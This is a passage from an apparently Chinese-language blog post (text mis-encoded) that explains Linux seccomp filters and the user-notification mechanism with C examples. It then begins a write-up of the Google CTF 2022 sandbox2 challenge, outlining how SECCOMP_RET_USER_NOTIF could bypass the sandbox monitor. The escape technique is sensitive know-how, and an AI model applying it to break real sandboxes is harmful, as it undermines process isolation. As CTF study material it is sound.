syscall(__NR_prctl,PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line">    <span class="comment">// Fork is forbidden </span></span><br><span class="line">    fork();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>filter ä¸­çš„å€¼å¯ä»¥ä» seccomp-tools ä¸­çœ‹åˆ°ã€‚</p>
<h2 id="Other-Samples"><a href="#Other-Samples" class="headerlink" title="Other Samples"></a>Other Samples</h2><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº› seccomp åº“å‡½æ•°æä¾›çš„å‡½æ•°ï¼Œæ¥åˆ›å»º seccomp æ²™ç®±ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -no-pie --static simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line">	ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_write, <span class="number">0</span>);</span><br><span class="line">	seccomp_load(ctx);</span><br><span class="line">	syscall(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&quot;abcd\n&quot;</span>,<span class="number">5</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Tip: seccmp lib would use malloc and free while prctl doesnâ€™t</p>
</blockquote>
<p>æ­¤å¤–è¿˜å¯ä»¥é€šè¿‡ prctl ç›´æ¥åˆ›å»º seccomp æ²™ç®±ã€‚å’Œå‰é¢æåˆ°çš„ç±»ä¼¼ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc ./main -o main</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span> &#123;</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0xc000003e</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x35</span>,<span class="number">0x07</span>,<span class="number">0x00</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x0000003b</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x00000001</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000024</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000020</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00000010</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">12</span>,sfi&#125;;</span><br><span class="line">	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;sfp);</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="seccomp-unotify"><a href="#seccomp-unotify" class="headerlink" title="seccomp_unotify"></a>seccomp_unotify</h1><p>Seccomp user-space çš„é€šçŸ¥æœºåˆ¶ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> operation, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">void</span> *args)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, SECCOMP_IOCTL_NOTIF_RECV, <span class="keyword">struct</span> seccomp_notif *req)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, SECCOMP_IOCTL_NOTIF_SEND, <span class="keyword">struct</span> seccomp_notif_resp *resp)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, SECCOMP_IOCTL_NOTIF_ID_VALID, __u64 *id)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, SECCOMP_IOCTL_NOTIF_ADDFD, <span class="keyword">struct</span> seccomp_notif_addfd *addfd)</span>;</span><br></pre></td></tr></table></figure>

<p>åœ¨ seccomp filter çš„å¸¸è§„ä½¿ç”¨ä¸­ï¼Œå¦‚ä½•å¤„ç†ç³»ç»Ÿè°ƒç”¨çš„å†³å®šç”± filter æœ¬èº«å†³å®šã€‚ç›¸åï¼Œuser-space çš„é€šçŸ¥æœºåˆ¶å…è®¸ seccomp filter å°†ç³»ç»Ÿè°ƒç”¨çš„å¤„ç†å§”æ‰˜ç»™å¦ä¸€ä¸ªç”¨æˆ·ç©ºé—´è¿›ç¨‹ã€‚æ³¨æ„ï¼Œè¯¥æœºåˆ¶æ˜¾ç„¶ä¸æ˜¯ä½œä¸ºå®ç°å®‰å…¨ç­–ç•¥çš„æ–¹æ³•ã€‚åœ¨ä¸‹é¢çš„è®¨è®ºä¸­ï¼Œåº”ç”¨ seccomp filter çš„çº¿ç¨‹è¢«ç§°ä¸º <text style="color:green">target</text>ï¼Œç”±ç”¨æˆ·ç©ºé—´é€šçŸ¥æœºåˆ¶é€šçŸ¥çš„è¿›ç¨‹è¢«ç§°ä¸º <text style="color:green">supervisor</text>ã€‚</p>
<p>å…·æœ‰é€‚å½“ç‰¹æƒçš„ <text style="color:green">supervisor</text> å¯ä»¥ä½¿ç”¨ç”¨æˆ·ç©ºé—´é€šçŸ¥æœºåˆ¶æ¥ä»£è¡¨ <text style="color:green">target</text> æ‰§è¡Œæ“ä½œã€‚ç”¨æˆ·ç©ºé—´é€šçŸ¥æœºåˆ¶çš„ä¼˜ç‚¹æ˜¯ï¼š<text style="color:green">supervisor</text> é€šå¸¸èƒ½å¤Ÿæ£€ç´¢æœ‰å…³ <text style="color:green">target</text> å’Œæ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨çš„ä¿¡æ¯ï¼Œè€Œ seccomp filter æœ¬èº«æ— æ³•æ£€ç´¢è¿™äº›ä¿¡æ¯ã€‚(seccomp filter åœ¨å†…æ ¸å†…çš„è™šæ‹Ÿæœºä¸Šè¿è¡Œï¼Œå› æ­¤å®ƒå¯ä»¥è·å¾—çš„ä¿¡æ¯å’Œå¯ä»¥æ‰§è¡Œçš„æ“ä½œå—åˆ°é™åˆ¶)</p>
<p>target å’Œ supervisor æ‰§è¡Œçš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><p>target ä»¥å¸¸è§„çš„æ–¹å¼å»ºç«‹ seccomp filterï¼Œä½†æ˜¯æœ‰ä¸¤ç‚¹ä¸åŒï¼š</p>
<ul>
<li>seccomp çš„ flags å‚æ•°å¿…é¡»åŒ…æ‹¬ SECCOMP_FILTER_FLAG_NEW_LISTENERã€‚å› æ­¤æˆåŠŸæ‰§è¡Œçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ–°çš„ç”¨äºæ¥æ”¶ notification çš„ â€œlisteningâ€ fdã€‚ä¸€ä¸ªçº¿ç¨‹åªèƒ½åº”ç”¨ä¸€ä¸ª â€œlisteningâ€ seccomp filterã€‚</li>
<li>åœ¨é€‚å½“çš„æƒ…å†µä¸‹ï¼Œseccomp filter ä¼šè¿”å› action value: SECCOMP_RET_USER_NOTIFï¼Œè¿™ä¸ªè¿”å›å€¼ä¼šè§¦å‘ä¸€ä¸ª notification eventã€‚</li>
</ul>
</li>
<li><p>ä¸ºäº†èƒ½ä½¿ supervisor ä½¿ç”¨ listening fd å¾—åˆ° notificationsï¼Œè¿™ä¸ª fd å¿…é¡»ä» target ä¼ é€’ç»™ supervisorã€‚å®ç°è¿™ç‚¹çš„ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡ target å’Œ supervisor ç›´æ¥çš„ UNIX socket å¥—æ¥å­—è¿æ¥ä¼ é€’ fdï¼ˆä½¿ç”¨ SCM_RIGHTS çš„é™„åŠ ä¿¡æ¯ï¼‰ï¼Œå¦ä¸€ç§åŠæ³•æ˜¯é€šè¿‡ <a href="https://man7.org/linux/man-pages/man2/pidfd_getfd.2.html">pidfd_getfd</a>ã€‚</p>
</li>
<li><p>supervisor å°†åœ¨ listening fd ä¸Šæ¥æ”¶åˆ° notification eventsã€‚è¿™äº› events å°†ä¼šè¿”å› seccomp_notif ç»“æ„ã€‚å› ä¸ºè¿™ä¸ªç»“æ„çš„ size å¯èƒ½ä¼šéšç€å†…æ ¸ç‰ˆæœ¬è€Œæ”¹å˜ï¼Œæ‰€æœ‰ supervisor å¿…é¡»é¦–å…ˆé€šè¿‡ seccomp(2) çš„SECCOMP_GET_NOTIF_SIZES operation è·å¾—å…¶ç»“æ„çš„ sizeï¼Œè¿™æ­¥ä¼šè¿”å›ä¸€ä¸ª seccomp_notif_sizes ç»“æ„ã€‚supervisor ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º seccomp_notif_sizes.seccomp_notif å­—èŠ‚çš„ç¼“å†²åŒºæ¥æ¥æ”¶ notification eventsã€‚æ­¤å¤–ï¼Œsupervisor è¿˜ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º seccomp_notif_sizes.seccomp_notif_resp å­—èŠ‚çš„ç¼“å†²åŒºæ¥å­˜æ”¾å‘å†…æ ¸å³ target çš„ responseï¼ˆä¸€ä¸ª seccomp_notif_resp ç»“æ„ï¼‰ã€‚</p>
<details class="note "><summary><p>è¿™æ˜¯<code>seccomp_notif</code>å’Œ<code>seccomp_notif_resp</code>çš„ç»“æ„</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_notif</span> &#123;</span></span><br><span class="line">               __u64  id;              <span class="comment">/* Cookie */</span></span><br><span class="line">               __u32  pid;             <span class="comment">/* TID of target thread */</span></span><br><span class="line">               __u32  flags;           <span class="comment">/* Currently unused (0) */</span></span><br><span class="line">               <span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> <span class="title">data</span>;</span>   <span class="comment">/* See seccomp(2) */</span></span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_notif_resp</span> &#123;</span></span><br><span class="line">               __u64 id;           <span class="comment">/* Cookie value */</span></span><br><span class="line">               __s64 val;          <span class="comment">/* Success return value */</span></span><br><span class="line">               __s32 error;        <span class="comment">/* 0 (success) or negative error number */</span></span><br><span class="line">               __u32 flags;        <span class="comment">/* See below */</span></span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>

</details>
</li>
<li><p>target æ‰§è¡Œå…¶å·¥ä½œï¼ŒåŒ…æ‹¬ seccomp filter ä¼šæ§åˆ¶ç³»ç»Ÿè°ƒç”¨ã€‚å½“è¿™äº›ç³»ç»Ÿè°ƒç”¨å…¶ä¸­ä¹‹ä¸€å¼•èµ· filter è¿”å› SECCOMP_RET_USER_NOTIF action valueï¼Œå†…æ ¸å°±ä¸ä¼šæ‰§è¡Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæ˜¯æš‚æ—¶é˜»å¡ targetï¼ˆåœ¨å¯è¢«ä¿¡å·ä¸­æ–­çš„ sleep çŠ¶æ€ï¼‰ç„¶ååœ¨ listening fd ä¸­ç”Ÿæˆä¸€ä¸ª notification eventã€‚</p>
</li>
<li><p>supervisor å¯ä»¥é‡å¤çš„ monitor listening fd ç­‰å¾… SECCOMP_RET_USER_NOTIF è¿™ä¸ªè§¦å‘äº‹ä»¶ã€‚ä¸ºäº†å®Œæˆè¿™ç‚¹ï¼Œsupervisor ä½¿ç”¨ SECCOMP_IOCTL_NOTIF_RECV ioctl æ“ä½œæ¥è¯»å–å…³äº notification event çš„ä¿¡æ¯ï¼Œè¿™ä¸ªæ“ä½œä¼šé˜»å¡ç›´åˆ°è·å¾—ä¸€ä¸ªå¯ç”¨çš„ eventã€‚æœ€ç»ˆä¼šè¿”å›ä¸€ä¸ªåŒ…å« target æ­£åœ¨è¯·æ±‚æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨çš„ä¿¡æ¯çš„ seccomp_notif  ç»“æ„ã€‚</p>
</li>
<li><p>SECCOMP_IOCTL_NOTIF_RECV ioctl æ“ä½œè¿”å›çš„ seccomp_notif ç»“æ„åŒ…æ‹¬äº†ä¼ ç»™ seccomp filter ç›¸åŒçš„ä¿¡æ¯ï¼ˆä¸€ä¸ª seccomp_data ç»“æ„ï¼‰ã€‚è¿™ä¸ªä¿¡æ¯å…è®¸ supervisor å‘ç° target æ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨å·å’Œå‚æ•°ã€‚æ­¤å¤–ï¼Œnotification event åŒ…æ‹¬äº†è§¦å‘ notification çš„ thread ID å’Œä¸€ä¸ªåœ¨åç»­ SECCOMP_IOCTL_NOTIF_ID_VALID å’Œ SECCOMP_IOCTL_NOTIF_SEND æ“ä½œä¸­ä½¿ç”¨çš„å”¯ä¸€çš„ cookie å€¼ã€‚notification ä¸­çš„ä¿¡æ¯å¯ä»¥ç”¨æ¥å‘ç° target çš„ç³»ç»Ÿè°ƒç”¨çš„æŒ‡é’ˆå‚æ•°å€¼ã€‚(è¿™æ˜¯åœ¨ seccomp è¿‡æ»¤å™¨ä¸­æ— æ³•åšåˆ°çš„ã€‚) supervisor å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹çš„ä¸€ä¸ªæ–¹æ³•æ˜¯æ‰“å¼€ç›¸åº”çš„ &#x2F;proc&#x2F;[tid]&#x2F;mem æ–‡ä»¶ï¼Œå¹¶ä»ä¸ notification event ä¸­æä¾›çš„æŒ‡é’ˆå‚æ•°å€¼ç›¸å¯¹åº”çš„ä½ç½®è¯»å–å­—èŠ‚ã€‚ (supervisor å¿…é¡»æ³¨æ„é¿å…åœ¨è¿™æ ·åšæ—¶å¯èƒ½å‡ºç°çš„æ¡ä»¶ç«äº‰)ã€‚æ­¤å¤–ï¼Œsupervisor è¿˜å¯ä»¥è®¿é—®å…¶ä»–åœ¨ç”¨æˆ·ç©ºé—´å¯è§çš„ç³»ç»Ÿä¿¡æ¯ï¼Œä½†è¿™äº›ä¿¡æ¯æ˜¯æ— æ³•ä» seccomp filter ä¸­è®¿é—®çš„ã€‚</p>
</li>
<li><p>å‰é¢æ­¥éª¤å·²ç»è·å¾—äº†ä¿¡æ¯ï¼Œsupervisor å¯ä»¥é€‰æ‹©åœ¨ response ä¸­ä¸º target çš„ç³»ç»Ÿè°ƒç”¨è¯·æ±‚æ‰§è¡Œä¸€ä¸ªæ“ä½œï¼ˆå½“è¿”å› SECCOMP_RET_USER_NOTIF action value æ—¶ï¼Œtarget è¯·æ±‚æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨æœªæ‰§è¡Œï¼Œåœ¨ç­‰å¾… responseï¼‰ã€‚ä¸€ä¸ªä¾‹å­æ˜¯å’Œå®¹å™¨ç›¸å…³ï¼Œtarget å¯èƒ½åœ¨å®¹å™¨å†…ï¼Œæ²¡æœ‰è¶³å¤Ÿçš„ capabilities åœ¨å®¹å™¨çš„ mount namespace æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚ä½†æ˜¯ï¼Œsupervisor å¯èƒ½æ˜¯ä¸€ä¸ªæœ‰æ›´å¤šæƒé™çš„è¿›ç¨‹ï¼Œæœ‰è¶³å¤Ÿçš„ capabilities å»å®ŒæˆæŒ‚è½½æ“ä½œã€‚</p>
</li>
<li><p>supervisor å‘é€ä¸€ä¸ª response ç»™ notificationã€‚è¿™ä¸ª response ä¸­çš„ä¿¡æ¯å°†è¢«å†…æ ¸ç”¨äºæ„é€ ä¸€ä¸ªè¿”å›å€¼ç»™ target çš„ç³»ç»Ÿè°ƒç”¨å¹¶æä¾›ä¸€ä¸ªåˆ†é…ç»™ target çš„ errno å˜é‡çš„å€¼ã€‚response é€šè¿‡ SECCOMP_IOCTL_NOTIF_SEND ioctl å‘é€ï¼Œç”¨äºä¼ é€’ä¸€ä¸ª seccomp_notif_resp ç»“æ„ç»™å†…æ ¸ã€‚è¿™ä¸ªç»“æ„å¿…é¡»åŒ…å«å‰æ–‡æåˆ°çš„ SECCOMP_IOCTL_NOTIF_RECV æ“ä½œè¿”å›çš„ seccomp_notif ç»“æ„ä¸­çš„ cookie å€¼ã€‚</p>
</li>
<li><p>ä¸€æ—¦ notification å‘é€ï¼Œtarget çº¿ç¨‹è¢«é˜»å¡çš„ç³»ç»Ÿè°ƒç”¨å°±ä¼šè¿”å›ç”± supervisor æä¾›çš„ notification response ä¸­çš„ä¿¡æ¯ã€‚</p>
</li>
</ol>
<p>ä½œä¸ºæœ€åä¸¤æ­¥ä¸­çš„å˜ç§ï¼Œsupervisor å¯ä»¥å‘é€ä¸€ä¸ª responseï¼Œå‘ŠçŸ¥äº†å†…æ ¸å®ƒåº”è¯¥æ‰§è¡Œ target çº¿ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚è¿™ç±» response çš„ flags å¿…é¡»åŒ…æ‹¬ SECCOMP_USER_NOTIF_FLAG_CONTINUEï¼Œerror å’Œ val å­—æ®µå¿…é¡»ä¸º 0ã€‚è¿™ç±» response åœ¨ä»¥ä¸‹æƒ…å†µå¾ˆæœ‰ç”¨ï¼š<strong>supervisor éœ€è¦å¯¹ target çš„ç³»ç»Ÿè°ƒç”¨è¿›è¡Œæ¯” seccomp filter æ›´æ·±å…¥çš„åˆ†æï¼ˆä¾‹å¦‚æ£€æŸ¥æŒ‡é’ˆå‚æ•°çš„å€¼ï¼‰ï¼Œå¹¶ä¸”åœ¨å†³å®šè¯¥ç³»ç»Ÿè°ƒç”¨ä¸éœ€è¦ supervisor çš„æ¨¡æ‹Ÿåï¼Œsupervisor å¸Œæœ›è¯¥ç³»ç»Ÿè°ƒç”¨åœ¨ target ä¸­æ­£å¸¸æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯ä¼šæ— è§† seccomp filter è€Œç›´æ¥æ”¾è¡Œã€‚</strong></p>
<h1 id="challenge-googlectf-2022-S2"><a href="#challenge-googlectf-2022-S2" class="headerlink" title="challenge: googlectf-2022-S2"></a>challenge: googlectf-2022-S2</h1><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>å°†ç”¨æˆ·è¾“å…¥çš„ç¨‹åºæ”¾åœ¨ sandbox ä¸­è¿è¡Œï¼Œåªå…è®¸ forkã€seccompã€ioctlã€exit è¿™å‡ ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="literal">nullptr</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="literal">nullptr</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Sandbox2 executor!&quot;</span>);</span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">ReadBinary</span>();</span><br><span class="line">  std::string path = absl::<span class="built_in">StrCat</span>(<span class="string">&quot;/proc/&quot;</span>, <span class="built_in">getpid</span>(), <span class="string">&quot;/fd/&quot;</span>, fd);</span><br><span class="line">  <span class="keyword">auto</span> policy = sandbox2::<span class="built_in">PolicyBuilder</span>()</span><br><span class="line">    .<span class="built_in">AllowStaticStartup</span>()</span><br><span class="line">    .<span class="built_in">AllowFork</span>()</span><br><span class="line">    .<span class="built_in">AllowSyscalls</span>(&#123;</span><br><span class="line">      __NR_seccomp,</span><br><span class="line">      __NR_ioctl,</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="built_in">AllowExit</span>()</span><br><span class="line">    .<span class="built_in">AddFile</span>(sapi::file_util::fileops::<span class="built_in">MakeAbsolute</span>(<span class="string">&quot;flag&quot;</span>, sapi::file_util::fileops::<span class="built_in">GetCWD</span>()))</span><br><span class="line">    .<span class="built_in">AddDirectory</span>(<span class="string">&quot;/dev&quot;</span>)</span><br><span class="line">    .<span class="built_in">AddDirectory</span>(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">    .<span class="built_in">AllowUnrestrictedNetworking</span>()</span><br><span class="line">    .<span class="built_in">BuildOrDie</span>();</span><br><span class="line">  std::vector&lt;std::string&gt; args = &#123;<span class="string">&quot;sol&quot;</span>&#125;;</span><br><span class="line">  <span class="keyword">auto</span> executor = std::<span class="built_in">make_unique</span>&lt;sandbox2::Executor&gt;(path, args);</span><br><span class="line">  <span class="function">sandbox2::Sandbox2 <span class="title">sandbox</span><span class="params">(std::move(executor), std::move(policy))</span></span>;</span><br><span class="line">  sandbox2::Result result = sandbox.<span class="built_in">Run</span>();</span><br><span class="line">  <span class="keyword">if</span> (result.<span class="built_in">final_status</span>() != sandbox2::Result::OK) &#123;</span><br><span class="line">    <span class="built_in">warnx</span>(<span class="string">&quot;Sandbox2 failed: %s&quot;</span>, result.<span class="built_in">ToString</span>().<span class="built_in">c_str</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®1.3èŠ‚ä¸­ SECCOMP_RET_USER_NOTIF çš„ä¼˜å…ˆçº§ä¼šå¤§äº SECCOMP_RET_TRACEï¼Œé‚£ä¹ˆåˆ›å»ºä¸€ä¸ª SECCOMP LISTENERï¼Œåˆ©ç”¨å…¶æ¥æ”¶åˆ°çš„ action value ä¼˜å…ˆçº§å¤§äº SECCOMP TRACEï¼Œå°±å¯ä»¥è‡ªå®šä¹‰è§„åˆ™å¤„ç†è¿™äº›ç³»ç»Ÿè°ƒç”¨è€Œç›‘æ§è¿›ç¨‹å°†ä¸ä¼šè¢«è§¦å‘ã€‚</p>
<p>åœ¨ sandboxd-api ä¸­å¯ä»¥å‘ç°è®¸å¤š SECCOMP_RET_TRACE å¹¶ä¸”è¿™äº›æƒ…å†µéƒ½ä¼šè¢« monitor å¤„ç†ã€‚</p>
<p>æ ¹æ® policy.cc ä¸­çš„æ³¨é‡Šï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The final policy is the concatenation of:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  1. default policy (GetDefaultPolicy, private),</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  2. user policy (user_policy_, public),</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  3. default KILL action (avoid failing open if user policy did not do it).</span></span><br></pre></td></tr></table></figure>

<p>æœ€ååº”ç”¨åˆ° filter ä¸­çš„è§„åˆ™ç”±ä»¥ä¸Šä¸‰éƒ¨åˆ†ç»„æˆï¼Œå…¶ä¸­ GetDefaultPolicyï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TRACE(val) \</span></span><br><span class="line"><span class="meta">	BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_TRACE | (val &amp; SECCOMP_RET_DATA))</span></span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;sock_filter&gt; <span class="title">Policy::GetDefaultPolicy</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  bpf_labels l = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  std::vector&lt;sock_filter&gt; policy = &#123;</span><br><span class="line">    <span class="comment">// If compiled arch is different from the runtime one, inform the Monitor.</span></span><br><span class="line">    LOAD_ARCH,</span><br><span class="line">    <span class="built_in">JEQ32</span>(Syscall::<span class="built_in">GetHostAuditArch</span>(), <span class="built_in">JUMP</span>(&amp;l, past_arch_check_l)),</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(SAPI_X86_64)</span></span><br><span class="line">    <span class="built_in">JEQ32</span>(AUDIT_ARCH_I386, <span class="built_in">TRACE</span>(sapi::cpu::kX86)),  <span class="comment">// 32-bit sandboxee</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="built_in">TRACE</span>(sapi::cpu::kUnknown),</span><br><span class="line">    <span class="built_in">LABEL</span>(&amp;l, past_arch_check_l),</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡é˜…è¯»è¿™å‡ ä¸ª policy æ„æˆçš„æºç å¾—å‡ºï¼Œæœ€ç»ˆçš„ policy &#x3D; default policy + user policy + default Kill actionã€‚user policy ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç¨‹åºä¸­å®šä¹‰çš„è§„åˆ™ã€‚</p>
<blockquote>
<p>Tipsï¼š</p>
<p>linux seccomp æ˜¯å®‰å…¨çš„ã€‚ä»–å…è®¸æˆ‘ä»¬ç¦æ­¢ä¸€ä¸ªå¯ç”¨çš„ syscall ä½†æ˜¯ä¸å…è®¸æˆ‘ä»¬ allow ä¸€ä¸ªè¢«ç¦æ­¢çš„ syscallã€‚</p>
</blockquote>
<p>å¦‚ä¸‹æµ‹è¯•æ˜¯å…ˆå…è®¸ write å†ç¦æ­¢ï¼š</p>
<details class="note "><summary><p>æµ‹è¯•æºç </p>
</summary>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> strict_filter2[] = &#123;</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                <span class="built_in">offsetof</span>(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, 